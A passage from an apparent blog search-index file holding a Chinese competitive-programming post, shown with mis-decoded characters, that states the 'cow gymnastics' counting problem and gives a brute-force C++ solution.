   cout<span class="token operator">&lt;&lt;</span>l<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å¥¶ç‰›ä½“æ“"><a href="#å¥¶ç‰›ä½“æ“" class="headerlink" title="å¥¶ç‰›ä½“æ“"></a>å¥¶ç‰›ä½“æ“</h2><p>ä¸ºäº†æé«˜å¥åº·æ°´å¹³ï¼Œå¥¶ç‰›ä»¬å¼€å§‹è¿›è¡Œä½“æ“è®­ç»ƒäº†ï¼</p><p>å†œå¤«çº¦ç¿°é€‰å®šäº†ä»–æœ€å–œçˆ±çš„å¥¶ç‰›$ Bessie$ æ¥æ‰§æ•™å…¶ä»– $N$ å¤´å¥¶ç‰›ï¼ŒåŒæ—¶è¯„ä¼°å¥¹ä»¬å­¦ä¹ ä¸åŒçš„ä½“æ“æŠ€æœ¯çš„è¿›åº¦ã€‚</p><p>$K$ æ¬¡è®­ç»ƒè¯¾çš„æ¯ä¸€æ¬¡ï¼Œ$Bessie$ éƒ½ä¼šæ ¹æ®$N$ å¤´å¥¶ç‰›çš„è¡¨ç°ç»™å¥¹ä»¬è¿›è¡Œæ’åã€‚</p><p>ä¹‹åï¼Œå¥¹å¯¹è¿™äº›æ’åçš„ä¸€è‡´æ€§äº§ç”Ÿäº†å¥½å¥‡ã€‚</p><p>ç§°ä¸€å¯¹ä¸åŒçš„å¥¶ç‰›æ˜¯ä¸€è‡´çš„ï¼Œå½“ä¸”ä»…å½“å…¶ä¸­ä¸€å¤´å¥¶ç‰›åœ¨æ¯æ¬¡è®­ç»ƒè¯¾ä¸­éƒ½è¡¨ç°å¾—éƒ½æ¯”å¦ä¸€å¤´è¦å¥½ã€‚</p><p>è¯·å¸®åŠ© $Bessie$ è®¡ç®—ä¸€è‡´çš„å¥¶ç‰›çš„å¯¹æ•°ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-4"><a href="#è¾“å…¥æ ¼å¼-4" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥çš„ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ­£æ•´æ•° $K$ å’Œ $N$ã€‚</p><p>ä»¥ä¸‹ $K$ è¡Œæ¯è¡ŒåŒ…å«æ•´æ•° $1â€¦N$ çš„æŸç§æ’åˆ—ï¼Œè¡¨ç¤ºå¥¶ç‰›ä»¬çš„æ’åï¼ˆå¥¶ç‰›ä»¬ç”¨ç¼–å· $1â€¦N$ è¿›è¡ŒåŒºåˆ†ï¼‰ã€‚</p><p>å¦‚æœåœ¨æŸä¸€è¡Œä¸­ $A$ å‡ºç°åœ¨ $B $ä¹‹å‰ï¼Œè¡¨ç¤ºå¥¶ç‰›$A$ è¡¨ç°å¾—æ¯”å¥¶ç‰› $B$ è¦å¥½ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-4"><a href="#è¾“å‡ºæ ¼å¼-4" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸€è¡Œï¼ŒåŒ…å«ä¸€è‡´çš„å¥¶ç‰›çš„å¯¹æ•°ã€‚</p><h4 id="æ•°æ®èŒƒå›´-4"><a href="#æ•°æ®èŒƒå›´-4" class="headerlink" title="æ•°æ®èŒƒå›´"></a>æ•°æ®èŒƒå›´</h4><p>$1â‰¤Kâ‰¤10$,<br>$1â‰¤Nâ‰¤20$</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-3"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-3" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">3 44 1 2 34 1 3 24 2 1 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-3"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-3" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-2"><a href="#æ ·ä¾‹è§£é‡Š-2" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>ä¸€è‡´çš„å¥¶ç‰›å¯¹ä¸º $(1,4)ã€(2,4)ã€(3,4)ã€(1,3)$ã€‚</p><h4 id="é¢˜è§£ï¼š-4"><a href="#é¢˜è§£ï¼š-4" class="headerlink" title="é¢˜è§£ï¼š"></a>é¢˜è§£ï¼š</h4><p>æš´åŠ›æšä¸¾</p><p>ç”¨<code>f[][]</code>æ ‡è®°æ¯èŠ‚è¯¾ç¬¦åˆè¦æ±‚ï¼ˆä¸€å¤´å¥¶ç‰›è¡¨ç°å¾—éƒ½æ¯”å¦ä¸€å¤´è¦å¥½ï¼‰çš„å¥¶ç‰›å¯¹æ•°ï¼Œæœ€åå¾ªç¯éå†ï¼Œæ‰¾åˆ°$n$æ¬¡è¯¾éƒ½æ»¡è¶³ï¼Œç­”æ¡ˆåŠ $1$ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;bits/stdc++.h&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> f<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>m<span class="token punctuation">;</span>    cin <span class="token operator">&gt;&gt;</span> n<span class="token operator">&gt;&gt;</span>m<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>            cin<span class="token operator">&gt;&gt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>f<span class="token punctuation">[</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> ans<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">&lt;=</span>m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span>n<span class="token punctuation">)</span>ans<span class="token operator">++</span><span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span>ans<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> acwing </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
